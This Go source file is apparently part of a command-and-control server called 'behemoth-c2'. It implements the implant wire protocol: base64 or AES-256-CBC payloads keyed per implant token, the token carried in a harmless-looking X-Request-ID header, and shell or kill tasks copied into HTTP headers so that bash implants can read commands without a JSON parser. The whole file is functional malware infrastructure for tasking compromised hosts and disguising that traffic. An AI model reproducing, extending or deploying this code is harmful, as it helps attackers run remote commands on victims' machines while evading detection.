package c2

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
)

// Wire encodings. "none" is base64(JSON) — confidentiality rides on TLS.
// "aes" is base64(AES-256-CBC(PKCS7(JSON))) with the IV in the X-IV header;
// the key is SHA-256("behemoth-c2:"+token), so every implant gets its own key.
const (
	encNone = "none"
	encAES  = "aes"
)

// Header names used by the implant protocol.
const (
	hdrSecret      = "X-Request-ID" // implant token
	hdrEnc         = "X-Behemoth-Enc"  // none | aes
	hdrIV          = "X-IV"         // hex IV for aes payloads
	hdrTaskID      = "X-Task-Id"    // mirrors body field so plain-shell implants need no JSON parser
	hdrTaskCmd     = "X-Task-Cmd"   // shell | kill
	hdrTaskArgs    = "X-Task-Args"  // base64 args
	hdrTaskTimeout = "X-Task-Timeout"
)

func wireKey(token string) []byte {
	sum := sha256.Sum256([]byte("behemoth-c2:" + token))
	return sum[:]
}

func pkcs7Pad(b []byte, blockSize int) []byte {
	n := blockSize - len(b)%blockSize
	return append(b, bytesOf(byte(n), n)...)
}

func pkcs7Unpad(b []byte) ([]byte, error) {
	if len(b) == 0 || len(b)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("bad ciphertext length")
	}
	n := int(b[len(b)-1])
	if n == 0 || n > aes.BlockSize || n > len(b) {
		return nil, fmt.Errorf("bad padding")
	}
	return b[:len(b)-n], nil
}

func bytesOf(v byte, n int) []byte {
	out := make([]byte, n)
	for i := range out {
		out[i] = v
	}
	return out
}

// encodePayload encodes v per enc and returns the body plus the response
// headers that describe the encoding (enc + iv).
func encodePayload(enc, token string, v any) ([]byte, map[string]string, error) {
	plain, err := json.Marshal(v)
	if err != nil {
		return nil, nil, err
	}
	if enc != encAES {
		return []byte(base64.StdEncoding.EncodeToString(plain)), map[string]string{hdrEnc: encNone}, nil
	}
	block, err := aes.NewCipher(wireKey(token))
	if err != nil {
		return nil, nil, err
	}
	iv := []byte(newHex(aes.BlockSize))
	ivRaw, _ := hex.DecodeString(string(iv))
	ct := make([]byte, len(pkcs7Pad(plain, aes.BlockSize)))
	cipher.NewCBCEncrypter(block, ivRaw).CryptBlocks(ct, pkcs7Pad(plain, aes.BlockSize))
	return []byte(base64.StdEncoding.EncodeToString(ct)), map[string]string{hdrEnc: encAES, hdrIV: string(iv)}, nil
}

// decodePayload decodes a request body into v. It accepts plain JSON as a
// fallback for manual testing with curl.
func decodePayload(enc, ivHex, token string, body []byte, v any) error {
	text := strings.TrimSpace(string(body))
	if text == "" {
		return fmt.Errorf("empty payload")
	}
	if enc != encAES {
		if json.Valid([]byte(text)) {
			return json.Unmarshal([]byte(text), v)
		}
		plain, err := base64.StdEncoding.DecodeString(text)
		if err != nil {
			return fmt.Errorf("malformed payload")
		}
		return json.Unmarshal(plain, v)
	}
	ct, err := base64.StdEncoding.DecodeString(text)
	if err != nil {
		return fmt.Errorf("malformed payload")
	}
	ivRaw, err := hex.DecodeString(strings.TrimSpace(ivHex))
	if err != nil || len(ivRaw) != aes.BlockSize {
		// Fall back to an IV prefixed to the ciphertext.
		if len(ct) < aes.BlockSize {
			return fmt.Errorf("missing IV")
		}
		ivRaw, ct = ct[:aes.BlockSize], ct[aes.BlockSize:]
	}
	block, err := aes.NewCipher(wireKey(token))
	if err != nil {
		return err
	}
	plain := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, ivRaw).CryptBlocks(plain, ct)
	plain, err = pkcs7Unpad(plain)
	if err != nil {
		return err
	}
	return json.Unmarshal(plain, v)
}

// taskHeaders flattens a CommandOut into headers so bash implants can read
// the command without a JSON parser. The body carries the same data.
func taskHeaders(c CommandOut) map[string]string {
	return map[string]string{
		hdrTaskID:   c.TaskID,
		hdrTaskCmd:  c.Cmd,
		hdrTaskArgs: base64.StdEncoding.EncodeToString([]byte(c.Args)),
	}
}
